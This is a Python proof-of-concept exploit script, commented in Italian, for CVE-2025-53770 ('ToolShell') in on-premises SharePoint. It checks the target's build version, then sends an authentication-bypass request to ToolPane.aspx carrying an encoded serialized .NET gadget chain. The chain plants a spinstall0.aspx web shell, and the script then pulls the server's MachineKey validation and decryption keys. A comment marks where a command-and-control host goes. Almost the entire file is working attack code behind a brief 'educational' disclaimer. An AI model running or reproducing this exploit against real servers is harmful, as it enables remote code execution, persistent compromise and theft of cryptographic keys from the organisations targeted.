#!/usr/bin/env python3
# ########################################################################################################################
# Proof-of-Concept Exploit per CVE-2025-53770 ("ToolShell")
#
# Autore: Emanuele De Lucia
#
# AVVISO: Questo script è fornito solo per scopi educativi. L'utente si assume la piena responsabilità durante l'utilizzo.
# EN: Author is NOT responsible for ANY misuse. 
# ########################################################################################################################

import requests
import urllib3
import argparse
import sys
import re
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD_FILENAME = "spinstall0.aspx" #ATTENZIONE: Non impatta sul nome del file scritto su server remoto

# Payload serializzato .NET. Scrive il file spinstall0.aspx sotto ../../../../../../../../../../../../Program Files/Common Files/Microsoft Shared/Web Server Extensions/16/TEMPLATE/LAYOUTS/spinstall0.aspx.
SERIALIZED_GADGET_CHAIN_B64 = "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"

PATCHED_BUILDS = {
    '2019': (16, 0, 10417, 20027),
}

def print_banner():
    print("=" * 70)
    print("CVE-2025-53770 - Exploit PoC")
    print("=" * 70)
    print("AVVISO: Solo per usi autorizzati.\n")

def parse_build_string(s):
    try:
        parts = s.strip().split('.')
        return tuple(int(p) for p in parts)
    except (ValueError, AttributeError):
        return None

def fetch_build_xml(session, target):
    url = urljoin(target, '/_vti_pvt/buildversion.xml')
    try:
        r = session.get(url, timeout=20, verify=False)
        if r.status_code == 200 and '<build' in r.text:
            m = re.search(r'version="([\d\.]+)"', r.text)
            if m:
                return parse_build_string(m.group(1))
    except requests.exceptions.RequestException:
        return None
    return None

def fetch_header_version(session, target):
    try:
        r = session.get(target, timeout=10, verify=False)
        header = r.headers.get('MicrosoftSharePointTeamServices')
        if header:
            return parse_build_string(header)
    except requests.exceptions.RequestException:
        return None
    return None

def test_deserialization_error(session, target):
    url = urljoin(target, "/_layouts/15/ToolPane.aspx?DisplayMode=Edit")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    }
    data = {'__EVENTVALIDATION': 'dummy', '__VIEWSTATE': 'dummy'}
    try:
        r = session.post(url, headers=headers, data=data, timeout=10, verify=False)
        if r.status_code == 500 and 'SerializationException' in r.text:
            return True
    except requests.exceptions.RequestException:
        return False
    return False


def preliminary_check(session, target_url):
    print(f"[*] Esecuzione del controllo preliminare...")
    
    print(f"    - Tentativo di determinare la versione di SharePoint...")
    build = fetch_build_xml(session, target_url)
    src = "buildversion.xml"
    if not build:
        print("      - buildversion.xml non trovato o illeggibile, tento con l'header...")
        build = fetch_header_version(session, target_url)
        src = "Header 'MicrosoftSharePointTeamServices'"
    
    if not build:
        print("    [!] ATTENZIONE: Impossibile determinare la versione di SharePoint.")
        print("        Procedo con il test comportamentale.")
    else:
        print(f"    - Versione rilevata ({src}): {'.'.join(map(str, build))}")
        patched_version = PATCHED_BUILDS.get('2019')
        if build >= patched_version:
            print("    [-] RISULTATO: Il server ha una versione patchata o superiore. NON VULNERABILE.")
            return False
        else:
            print("    [+] RISULTATO: Il server ha una versione precedente a quella patchata. POTENZIALMENTE VULNERABILE.")
            return True
    print("\n    - Esecuzione del test di errore di deserializzazione su ToolPane.aspx...")
    if test_deserialization_error(session, target_url):
        print("    [+] RISULTATO: L'endpoint ha restituito un errore di deserializzazione coerente con la vulnerabilità.")
        print("[+] Controllo preliminare SUPERATO. Il target sembra vulnerabile. Procedo con l'exploit.")
        return True
    else:
        print("    [-] RISULTATO: L'endpoint non ha restituito l'errore di deserializzazione atteso.")
        print("        Questo potrebbe indicare che non è vulnerabile.")
        return False


def upload_payload(session, target_url):
    endpoint_path = "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"
    upload_url = urljoin(target_url, endpoint_path)
    
    headers = {
        "Referer": urljoin(target_url,"/_layouts/SignOut.aspx"),
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Connection": "close"
    }

    payload = f"""
<%@ Register Tagprefix="Scorecard" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
<%@ Register Tagprefix="asp" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>
<asp:UpdateProgress ID="UpdateProgress1" DisplayAfter="10" runat="server" AssociatedUpdatePanelID="upTest">
<ProgressTemplate>
  <div class="divWaiting">
    <Scorecard:ExcelDataSet CompressedDataTable="{SERIALIZED_GADGET_CHAIN_B64}" DataTable-CaseSensitive="false" runat="server" />
  </div>
</ProgressTemplate>
</asp:UpdateProgress>
"""
    
    data = {
        #USARE C2 HOST QUI
        "MSOTlPn_Uri": "http://localhost/_controltemplates/15/AclEditor.ascx",
        #PAYLOAD FINALE
        "MSOTlPn_DWP": payload
    }

    print(f"\n[*] Fase 1: Tentativo di caricamento di '{PAYLOAD_FILENAME}'...")
    print(f"    - Endpoint: {upload_url}")
    
    try:
        response = session.post(upload_url, headers=headers, data=data, verify=False, timeout=10)
        print(f"[*] Richiesta di caricamento inviata. Status Code ricevuto: {response.status_code}")
        
        possible_paths = [
            f"/_layouts/15/{PAYLOAD_FILENAME}"
        ]

        for path in possible_paths:
            payload_url = urljoin(target_url, path)
            print(f"[*] Verifica dell'esistenza del file a: {payload_url}")
            try:
                check_res = session.get(payload_url, verify=False, timeout=15)
                if check_res.status_code == 200:
                    print(f"[+] SUCCESSO! Il payload è stato caricato correttamente e trovato a {payload_url}")
                    return payload_url
            except requests.exceptions.RequestException:
                continue

        print(f"[-] FALLIMENTO. Impossibile accedere al payload dopo il caricamento in nessuna delle posizioni note.")
        print("[-] Il target potrebbe non essere vulnerabile o la configurazione del server è diversa.")
        return None

    except requests.exceptions.RequestException as e:
        print(f"[-] Errore di rete durante il caricamento: {e}")
        return None

def exfiltrate_key(session, payload_url):
    print(f"\n[*] Fase 2: Tentativo di esfiltrazione della MachineKey da: {payload_url}")
    
    try:
        response = session.get(payload_url, verify=False, timeout=15)
        
        if response.status_code == 200 and '|' in response.text and len(response.text.split('|')) == 5:
            parts = response.text.strip().split('|')
            validation_key = parts[0]
            validation_algo = parts[1]
            decryption_key = parts[2]
            decryption_algo = parts[3]
            compat_mode = parts[4]

            print("\n" + "="*20 + " COMPROMISSIONE RIUSCITA " + "="*20)
            print("[+] Le chiavi crittografiche del server sono state esfiltrate.")
            print(f"  [+] ValidationKey:   {validation_key}")
            print(f"  [+] ValidationAlgo:  {validation_algo}")
            print(f"  [+] DecryptionKey:   {decryption_key}")
            print(f"  [+] DecryptionAlgo:  {decryption_algo}")
            print(f"  [+] Compatibility:   {compat_mode}")
            print("="*70)
            return True
        else:
            print(f"[-] FALLIMENTO. Impossibile eseguire o parsare il payload (Status: {response.status_code}).")
            print(f"    Risposta ricevuta (primi 250 caratteri):\n{response.text[:250]}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Errore di rete durante l'esfiltrazione: {e}")
        return False

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="PoC di sfruttamento attivo per CVE-2025-53770")
    parser.add_argument("-t", "--target", required=True, help="URL di base del server SharePoint target (es. http://<YOUR_HOST>:80)")
    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
        
    args = parser.parse_args()
    
    session = requests.Session()
    
    try:
        if not preliminary_check(session, args.target):
            sys.exit(1)
        successful_url = upload_payload(session, args.target)
        if successful_url:
            exfiltrate_key(session, successful_url)
        else:
            print("\n[-] La catena di exploit è fallita. Il server non sembra essere vulnerabile.")

    except KeyboardInterrupt:
        print("\n[!] Esecuzione interrotta dall'utente.")
    except Exception as e:
        print(f"\n[-] Si è verificato un errore imprevisto: {e}")

if __name__ == "__main__":
    main()
